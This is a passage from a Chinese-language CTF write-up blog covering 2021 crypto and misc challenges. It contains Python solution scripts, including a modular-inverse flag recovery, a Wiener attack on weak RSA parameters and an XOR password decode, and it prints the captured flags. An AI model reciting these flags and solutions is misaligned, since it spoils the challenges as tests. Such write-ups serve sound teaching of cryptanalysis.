<p>首先下面的这个式子是毫无疑问的</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831174555837.png" alt></p>
<p>然后后面的10是2的倍数，可以约去一个2剩下$5^{175}$。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210831174736957.png" alt></p>
<p>然后用一下欧拉定理与求乘法逆元很简单就能得到flag了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
assert(len(open('flag.txt', 'rb').read()) &lt; 50)
assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') &lt;&lt; 10000).endswith(
    '1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008'))
"""</span>

end <span class="token operator">=</span> <span class="token number">1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008</span>

mod <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">175</span>
phi <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">175</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">**</span> <span class="token number">174</span>
inv <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">,</span> phi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mod<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>end <span class="token operator">*</span> inv<span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;90ee7e8df270bf5133a95ff904a059b8&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="ALLES-CTF-2021"><a href="#ALLES-CTF-2021" class="headerlink" title="ALLES! CTF 2021"></a>ALLES! CTF 2021</h1><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Pyimplant"><a href="#Pyimplant" class="headerlink" title="Pyimplant"></a>Pyimplant</h3><p>pyc文件隐写，直接用工具一把梭</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210904121758023.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">ALLES!&#123;py7h0n_byt3cod3_s3cr3ts&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p>robots文件</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210904123143069.png" alt></p>
<h1 id="GrabCON-CTF"><a href="#GrabCON-CTF" class="headerlink" title="GrabCON CTF"></a>GrabCON CTF</h1><h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm-up"></a>Warm-up</h3><p>多重base加密</p>
<pre class="line-numbers language-题目" data-language="题目"><code class="language-题目">S01ZRENXU1NJVkhGUVZKUkpaRkZNMlNLSTVKVENWU0xLVlZYQVlLVElaTkVVVlRNS0pIRkc2U1dKVkpHV01LWEtaQ1VVVENXTlJORlNVS1dOUkdGS01EVUs1S0dXVlNLS1pDWFFUQ1ROUllFT1VUTE1STFZDTUxFSk5MR1c0Q0lLWVlEQ1RDWEtWMkZNVjJWTkJKRk1SS09MQktHV05EWktKV0U0VlNOTlJTRVdWVEtLSkxWR01CUklOTEdXNUNQS05XRkVSQ1dLWkhFSVVaUk9CTUZFMjJXS1ZKVENXU0tLWlZWVVJTVUdGTEZLVkNGR0ZIVTRSU1ZQRkdXWVRTTUtOVlRLVEtTR0ZSVEFVSlFNUkdGSVZUTUs1SkZNVExaS1pWWElWMk5OTkxFNFZUS0pKTFZJUkxRSlZKR1dNS1RLTVlEU1RDVk5OMkVRVjJXSlpLRk1WTFVKTkpUQ1VTRUtaV0U0VjJTR0JORklVU1dNUkxGTVJMVUpSSldXNkNYS0lZVlVSQ1RHQVlVT1ZDRk1STUU0VktPS0ZKVENTU0VLWldGTVZLUkdGU0U2VkxMTVJNVktNS1dNRktXV09LREtFWUZVVUNWTk4yRVFVWlJPQkdGTVJLT0s1S1RBM0NNS0pWWFFTQ1hLWlNFSVZMTE1SRFZJMjIySlJMR1dUU0hLSVlWVVMyV05OU0ZHVTMySkpGRksyM0VLVklWTVVTVUtSS1hJVDJXR0JORk1WTDJKSk1GRU1DMktOTEVLUlNXS05XRU1VQ1JOTlNFT1ZEMkpGNUZPVkxMR0ZKVEFXU09LWVlVNFJTVEdGWUVJVlJRTlJKRTIyWlZKNUtHV05LR0tWTEZVVkNXTk00VUdVM0xMSkZGSzIzWUtKSldXU1NMS0lZV0dNS1JHRkpFWVZMTEpaTVZLVlNPSlJLVEE1Q1NLNUtWRVZDV0tWSEZNVVJRSVVZRk0yMkdLWkpXVVZTSktaS0RBT0tRS1FZRFNVQ1JIVTZRPT09PQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">GrabCON&#123;dayuum_s0n!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="PokA©-Ball-RSA"><a href="#PokA©-Ball-RSA" class="headerlink" title="PokÃ© Ball RSA"></a>PokÃ© Ball RSA</h3><p>维纳攻击</p>
<pre class="line-numbers language-题目" data-language="题目"><code class="language-题目">n &#x3D; 498934084350094415783044823223130007435556803301613073259727203199325937230080661117917023582579699673759861892703348357714077684549303787581429366922208568924252052118455313229534699860304480039147103608782140303489222166267907007839021544433148286217133494762766492655602977085105487216032806292874190551319
e &#x3D; 134901827939710543990222584187396847806193644190423846456160711527109836908087675183249532946675670587286594441908191054495871501233678465783530503352727362726294270065122447852357566161748618195216611965946646411519602447104878893524856862722902833460104389620397589021732407447981724307130484482495521398799
c &#x3D; 100132888193232309251839777842498074992587507373917163874335385921940537055226546911990198769720313749286675018486390873216490470403470144298153410686092752282228631590006943913867497072931343354481759219425807850047083814816718302223434388744485547550941814186146959750515114700335721173624212499886218608818<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>注意到e很大，采用维纳攻击。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">import</span> owiener

n <span class="token operator">=</span> <span class="token number">498934084350094415783044823223130007435556803301613073259727203199325937230080661117917023582579699673759861892703348357714077684549303787581429366922208568924252052118455313229534699860304480039147103608782140303489222166267907007839021544433148286217133494762766492655602977085105487216032806292874190551319</span>
e <span class="token operator">=</span> <span class="token number">134901827939710543990222584187396847806193644190423846456160711527109836908087675183249532946675670587286594441908191054495871501233678465783530503352727362726294270065122447852357566161748618195216611965946646411519602447104878893524856862722902833460104389620397589021732407447981724307130484482495521398799</span>
c <span class="token operator">=</span> <span class="token number">100132888193232309251839777842498074992587507373917163874335385921940537055226546911990198769720313749286675018486390873216490470403470144298153410686092752282228631590006943913867497072931343354481759219425807850047083814816718302223434388744485547550941814186146959750515114700335721173624212499886218608818</span>
d <span class="token operator">=</span> owiener<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>


c <span class="token operator">=</span> <span class="token number">9019127052844164572606928250741960583163943438936945828390420331200602392329</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># GrabCON&#123;((^_^))&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Old-Monk’s-Password"><a href="#Old-Monk’s-Password" class="headerlink" title="Old Monk’s Password"></a>Old Monk’s Password</h3><p>一个简单的求逆的运算</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token string">b'\x0cYUV\x02\x13\x16\x1a\x01\x04\x05C\x00\twcx|z(((%.)=K%(>'</span>
enc1 <span class="token operator">=</span> <span class="token string">b'\x0bPPS\r\x0b\x02\x0f\x12\r\x03_G\t\x08yb&#125;v+--*+*8=W,>'</span>
enc2 <span class="token operator">=</span> <span class="token string">b'\x07A[\x06\\\r\x15\t\x04\x07\x18VG]U]@\x02\x08&amp;9&amp;%\' 41".;'</span>

<span class="token keyword">import</span> codecs
<span class="token keyword">import</span> random

<span class="token triple-quoted-string string">"""
class pass_w:
    x = "hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"

    def encode(self, text, i=-1):

        if i &lt; 0 or i > len(self.x) + 1:
            i = random.randint(0, len(self.x) + 1)

        out = chr(i)
        for c in text:
            out += chr(ord(c) ^ ord(self.x[i]))
            i = (i + 1) % 79

        return codecs.encode(out)


y = pass_w()
print(y.encode("REDACTED"))

# Enclose password within GrabCON&#123;&#125;
"""</span>
x <span class="token operator">=</span> <span class="token string">"hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"</span>

i <span class="token operator">=</span> <span class="token number">12</span>
res <span class="token operator">=</span> <span class="token string">''</span>
enc <span class="token operator">=</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># GrabCON&#123;817letmein40986728ilikeapples&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>签到</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">GrabCON&#123;welcome_to_grabcon_2021&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Discord-1"><a href="#Discord-1" class="headerlink" title="Discord"></a>Discord</h3><p>这几个签到真的离谱。。。</p>
<p>签到2</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="OSINT-1"><a href="#OSINT-1" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Victim-1"><a href="#Victim-1" class="headerlink" title="Victim 1"></a>Victim 1</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">M4XLMUM</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://m4xlmum.github.io/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/">https://m4xlmum.github.io/2021/05/29/2021年各比赛wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://m4xlmum.github.io" target="_blank">M4XLMUM</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_wechat"></a><a class="a2a_button_sina_weibo"></a><a class="a2a_button_facebook_messenger"></a><a class="a2a_button_email"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><img class="prev-cover" src="/img/topimg/image-20210530234831511.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Golang学习笔记</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><img class="next-cover" src="/img/topimg/image-20210530010942776.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/26/DAMNCON2021CTF/" title="DAMNCON2021CTF"><img class="cover" src="/img/topimg/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-26</div><div class="title">DAMNCON2021CTF</div></div></a></div><div><a href="/2021/05/28/CTF/" title="CTF做题笔记"><img class="cover" src="/img/topimg/image-20210528154723696.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-28</div><div class="title">CTF做题笔记</div></div></a></div><div><a href="/2021/09/27/DASCTF9月赛X浙江工业大学秋季挑战赛/" title="DASCTF9月赛 X 浙江工业大学秋季挑战赛"><img class="cover" src="/img/topimg/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-27</div><div class="title">DASCTF9月赛 X 浙江工业大学秋季挑战赛</div></div></a></div><div><a href="/2021/09/27/使用ida进行动态调试的配置/" title="使用ida进行动态调试的配置"><img class="cover" src="/img/topimg/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-27</div><div class="title">使用ida进行动态调试的配置</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E6%9C%89%E9%99%90%EF%BC%8C%E5%A4%A7%E5%AE%B6%E5%8C%85%E6%B6%B5"><span class="toc-number">1.1.</span> <span class="toc-text">水平有限，大家包涵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%B0%E5%BD%95%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.</span> <span class="toc-text">记录内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DozerCTF"><span class="toc-number">2.</span> <span class="toc-text">DozerCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E4%BC%9A%E6%9C%89%E4%BA%BA%E4%BB%A5%E4%B8%BAre%E9%82%A3%E9%81%93%E6%89%8D%E6%98%AF%E7%AD%BE%E5%88%B0%E5%90%A7"><span class="toc-number">2.1.1.</span> <span class="toc-text">不会有人以为re那道才是签到吧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmisc"><span class="toc-number">2.1.2.</span> <span class="toc-text">ezmisc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">用到的在线网站</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">解题过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-X-BUU"><span class="toc-number">3.</span> <span class="toc-text">DASCTF X BUU</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E4%BA%8B%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">赛事介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-1"><span class="toc-number">3.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">3.2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Holmes"><span class="toc-number">3.2.2.</span> <span class="toc-text">Holmes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rickroll-u"><span class="toc-number">3.2.3.</span> <span class="toc-text">rickroll_u</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">3.3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PaperPlease"><span class="toc-number">3.3.1.</span> <span class="toc-text">PaperPlease</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#end"><span class="toc-number">3.3.2.</span> <span class="toc-text">end</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">3.4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RelatedMessage"><span class="toc-number">3.4.1.</span> <span class="toc-text">RelatedMessage</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby%E6%9D%AF-CTFshow%E5%85%AD%E4%B8%80%E5%84%BF%E7%AB%A5%E8%8A%82%E7%89%B9%E8%BE%91"><span class="toc-number">4.</span> <span class="toc-text">baby杯(CTFshow六一儿童节特辑)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-2"><span class="toc-number">4.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E5%AD%90%E6%A3%8B"><span class="toc-number">4.1.1.</span> <span class="toc-text">五子棋</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8E%E4%B8%BD%E7%9A%84%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">4.1.2.</span> <span class="toc-text">美丽的小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyLSB"><span class="toc-number">4.1.3.</span> <span class="toc-text">babyLSB</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Xctf-7%E6%9C%88%E8%B5%9B"><span class="toc-number">5.</span> <span class="toc-text">Xctf 7月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">5.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">5.2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ad-Network"><span class="toc-number">5.2.1.</span> <span class="toc-text">Ad Network</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rebyc"><span class="toc-number">5.3.</span> <span class="toc-text">rebyc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CAPTCHA-The-Flag"><span class="toc-number">5.3.1.</span> <span class="toc-text">CAPTCHA The Flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CCTF"><span class="toc-number">6.</span> <span class="toc-text">CCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-2"><span class="toc-number">6.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warm-up"><span class="toc-number">6.2.</span> <span class="toc-text">warm-up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mic-check"><span class="toc-number">6.2.1.</span> <span class="toc-text">mic check</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy"><span class="toc-number">6.3.</span> <span class="toc-text">easy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Farm"><span class="toc-number">6.3.1.</span> <span class="toc-text">Farm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeyBase"><span class="toc-number">6.3.2.</span> <span class="toc-text">KeyBase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Symbols"><span class="toc-number">6.3.3.</span> <span class="toc-text">Symbols</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium-easy"><span class="toc-number">6.4.</span> <span class="toc-text">medium-easy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hamul"><span class="toc-number">6.4.1.</span> <span class="toc-text">Hamul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rima"><span class="toc-number">6.4.2.</span> <span class="toc-text">Rima</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RaRCTF"><span class="toc-number">7.</span> <span class="toc-text">RaRCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-3"><span class="toc-number">7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">7.2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lemonthinker-100-points"><span class="toc-number">7.2.1.</span> <span class="toc-text">lemonthinker (100 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Uploader-150-points"><span class="toc-number">7.2.2.</span> <span class="toc-text">Secure Uploader (150 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fancy-Button-Generator-100-points"><span class="toc-number">7.2.3.</span> <span class="toc-text">Fancy Button Generator (100 points)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">7.3.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#discord-10-points"><span class="toc-number">7.3.1.</span> <span class="toc-text">discord (10 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coherence-Check-10-points"><span class="toc-number">7.3.2.</span> <span class="toc-text">Coherence Check (10 points)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">7.4.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#minigen-100-points"><span class="toc-number">7.4.1.</span> <span class="toc-text">minigen (100 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sRSA-100-points"><span class="toc-number">7.4.2.</span> <span class="toc-text">sRSA (100 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unrandompad-150-points-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="toc-number">7.4.3.</span> <span class="toc-text">unrandompad (150 points) 未解出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babycrypt-200-points"><span class="toc-number">7.4.4.</span> <span class="toc-text">babycrypt (200 points)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rev"><span class="toc-number">7.5.</span> <span class="toc-text">rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#verybabyrev-100-points"><span class="toc-number">7.5.1.</span> <span class="toc-text">verybabyrev (100 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dotty-150-points"><span class="toc-number">7.5.2.</span> <span class="toc-text">Dotty (150 points)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Very-TriVial-ReVersing"><span class="toc-number">7.5.3.</span> <span class="toc-text">Very TriVial ReVersing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-FeedBack-Form"><span class="toc-number">7.5.4.</span> <span class="toc-text">Misc &#x2F; FeedBack Form</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-Farewell"><span class="toc-number">7.5.5.</span> <span class="toc-text">Misc &#x2F; Farewell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-My-Artwork"><span class="toc-number">7.5.6.</span> <span class="toc-text">Misc &#x2F; My Artwork</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-Data-Breach"><span class="toc-number">7.5.7.</span> <span class="toc-text">Misc &#x2F; Data Breach</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-1"><span class="toc-number">7.6.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-Xoro"><span class="toc-number">7.6.1.</span> <span class="toc-text">Crypto &#x2F; Xoro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-MACAW"><span class="toc-number">7.6.2.</span> <span class="toc-text">Crypto &#x2F; MACAW</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B2021"><span class="toc-number">8.</span> <span class="toc-text">第五届XMan选拔赛2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-4"><span class="toc-number">8.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-1"><span class="toc-number">8.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#try-all-volatility"><span class="toc-number">8.2.1.</span> <span class="toc-text">try_all_volatility</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-number">8.3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-1"><span class="toc-number">8.3.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyssti"><span class="toc-number">8.3.2.</span> <span class="toc-text">easyssti</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCTS-CERT-CTF-2021"><span class="toc-number">9.</span> <span class="toc-text">RCTS CERT CTF 2021</span></a><ol 